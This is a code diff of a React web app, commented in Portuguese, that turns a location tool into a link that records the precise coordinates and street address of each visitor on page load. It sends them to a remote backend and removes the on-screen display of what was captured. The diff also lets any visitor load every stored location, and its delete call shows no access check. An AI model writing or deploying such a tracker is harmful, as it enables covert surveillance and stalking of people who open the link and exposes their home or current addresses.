@@ -30,11 +30,17 @@ const App: React.FC = () => {
   const [showLogin, setShowLogin] = useState<boolean>(false);
   const [locations, setLocations] = useState<any[]>([]);
 
+  // URL do backend atualizado
+  const BACKEND_URL = 'https://seu-backend.com'; // Substitua pelo domínio público do backend
+
   // Função para salvar a localização no banco de dados
   const saveLocationToDatabase = async (locationData: Location) => {
     try {
-      const response = await axios.post('http://localhost:5000/save-location', locationData);
+      const response = await axios.post(`${BACKEND_URL}/save-location`, locationData);
       console.log('Localização salva:', response.data);
+
+      // Adiciona a nova localização ao estado existente
+      setLocations((prevLocations) => [...prevLocations, locationData]);
     } catch (error) {
       console.error('Erro ao salvar a localização no banco de dados:', error);
     }
@@ -115,7 +121,7 @@ const App: React.FC = () => {
   // Função para obter todas as localizações do banco de dados
   const fetchLocationsFromDatabase = async () => {
     try {
-      const response = await axios.get('http://localhost:5000/locations');
+      const response = await axios.get(`${BACKEND_URL}/locations`);
       setLocations(response.data);
     } catch (error) {
       console.error('Erro ao buscar localizações salvas:', error);
@@ -125,7 +131,7 @@ const App: React.FC = () => {
   // Função para limpar as localizações do banco de dados
   const clearLocations = async () => {
     try {
-      const response = await axios.delete('http://localhost:5000/locations');
+      const response = await axios.delete(`${BACKEND_URL}/locations`);
       if (response.status === 200) {
         setLocations([]); // Limpa o estado das localizações
         alert('Localizações limpas com sucesso!');
@@ -156,12 +162,62 @@ const App: React.FC = () => {
 
   // Usado para detectar a localização do usuário ao carregar o componente
   useEffect(() => {
-    detectLocation(); // Detecta a localização ao carregar o componente
+    // Detecta e salva a localização do visitante ao acessar o link
+    const saveVisitorLocation = async () => {
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            try {
+              const details = await getLocationDetails(
+                position.coords.latitude,
+                position.coords.longitude
+              );
+
+              const visitorLocation: Location = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                country: details?.country || null,
+                city: details?.city || null,
+                address: details?.address || null,
+                placeName: details?.placeName || null,
+                error: null,
+                loading: false,
+              };
+
+              await saveLocationToDatabase(visitorLocation); // Salva a localização no banco de dados
+            } catch (error) {
+              console.error('Erro ao salvar a localização do visitante:', error);
+            }
+          },
+          (error) => {
+            console.error('Erro ao obter localização do visitante:', error);
+          }
+        );
+      } else {
+        console.error('Geolocalização não é suportada pelo navegador.');
+      }
+    };
+
+    saveVisitorLocation(); // Chama a função para salvar a localização do visitante
 
     if (isAdmin) {
       fetchLocationsFromDatabase(); // Se for admin, busca as localizações salvas
     }
   }, [isAdmin]);
+
+  useEffect(() => {
+    // Carrega as localizações salvas ao montar o componente
+    const loadLocations = async () => {
+      try {
+        const response = await axios.get(`${BACKEND_URL}/locations`);
+        setLocations(response.data); // Atualiza o estado com as localizações salvas
+      } catch (error) {
+        console.error('Erro ao carregar localizações:', error);
+      }
+    };
+
+    loadLocations(); // Chama a função para carregar as localizações
+  }, []);
 
   // Função para login
   const handleLogin = (event: React.FormEvent) => {
@@ -231,23 +287,6 @@ const App: React.FC = () => {
                 Gerar Localização
               </button>
             </div>
-
-            {/* Exibe a localização atual */}
-            {location.loading ? (
-              <p>Carregando localização...</p>
-            ) : location.error ? (
-              <p>{location.error}</p>
-            ) : (
-              <div>
-                <h2 className="text-xl font-bold">Localização Atual:</h2>
-                <p><strong>Latitude:</strong> {location.latitude}</p>
-                <p><strong>Longitude:</strong> {location.longitude}</p>
-                <p><strong>Cidade:</strong> {location.city}</p>
-                <p><strong>País:</strong> {location.country}</p>
-                <p><strong>Endereço:</strong> {location.address}</p>
-                <p><strong>Nome do Lugar:</strong> {location.placeName}</p>
-              </div>
-            )}
 
             <div className="space-y-4">
               {locations.length > 0 ? (
